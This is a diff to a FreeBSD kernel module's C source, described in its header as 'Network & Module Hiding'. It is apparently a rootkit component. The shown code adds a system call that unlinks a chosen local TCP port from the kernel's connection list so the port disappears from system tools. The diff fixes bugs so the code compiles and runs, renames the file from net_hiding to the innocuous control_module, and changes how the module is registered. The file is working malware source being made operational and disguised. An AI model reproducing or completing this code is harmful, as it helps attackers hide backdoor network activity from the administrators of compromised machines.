@@ -1,12 +1,12 @@
 /*
  * =====================================================================================
  *
- *       Filename:  net_hiding.c
+ *       Filename:  control_module.c
  *
  *    Description:  Network & Module Hiding
  *
  *        Version:  1.0
- *        Created:  22/06/2011 01:13:16
+ *        Created:  2012-05-30 01:13:16
  *       Revision:  none
  *       Compiler:  gcc
  *
@@ -15,7 +15,7 @@
  *
  * =====================================================================================
  */
-#include "net_hiding.h"
+#include "control_module.h"
 
 /* System call to hide an open local network port. */
 static int hide_port(struct thread *td, void *syscall_args)
@@ -27,18 +27,20 @@ static int hide_port(struct thread *td, void *syscall_args)
 
     INP_INFO_WLOCK(&tcbinfo);
 
-    /* Iteratr through the TCP-based inpcb list */
-    LIST_FOREACH(inpb, tcbinfo.listthread, inp_list) {
+    /* Iterate through the TCP-based inpcb list */
+    LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
         if (inpb->inp_vflag & INP_TIMEWAIT)
             continue;
 
-        INP_LOCK(inpb);
+		/* lock writing to the kernel struct */
+        INP_WLOCK(inpb);
 
         /* Check to see if this is the port we want hidden */
         if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
-            LIST_REMOVE(inpb inp_list);
+            LIST_REMOVE(inpb, inp_list);
 
-        INP_UNLOCK(inpb);
+		/* unlock writing to the kernel struct */
+        INP_WUNLOCK(inpb);
     }
 
     INP_INFO_WUNLOCK(&tcbinfo);
@@ -133,11 +135,11 @@ static int module_events(struct module *module, int cmd, void *arg)
     return error;
 }
 
-static moduledata_t net_hiding_mod = {
+static moduledata_t control_module_mod = {
     MODULE_NAME,    /* module name */
     module_events,  /* event handler */
     NULL            /* extra data */
 };
 
-SYSCALL_MODULE(net_hiding, &offset, &hidden_port_sysent, module_events, NULL);
-//DECLARE_MODULE(net_hiding, net_hiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+//SYSCALL_MODULE(control_module, &offset, &hidden_port_sysent, module_events, NULL);
+DECLARE_MODULE(control_module, control_module_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
